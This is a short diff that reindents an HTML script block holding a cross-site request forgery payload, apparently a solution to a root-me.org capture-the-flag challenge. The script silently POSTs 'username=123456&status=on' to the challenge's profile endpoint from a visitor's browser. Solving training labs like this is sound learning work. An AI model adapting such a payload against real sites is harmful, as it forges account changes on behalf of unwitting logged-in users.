@@ -1,8 +1,8 @@
-      <script>
-      var rq=new XMLHttpRequest();
-      rq.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
-      rq.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-      rq.send("username=123456&status=on");
-      </script>
+<script>
+var rq=new XMLHttpRequest();
+rq.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
+rq.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+rq.send("username=123456&status=on");
+</script>
 
 
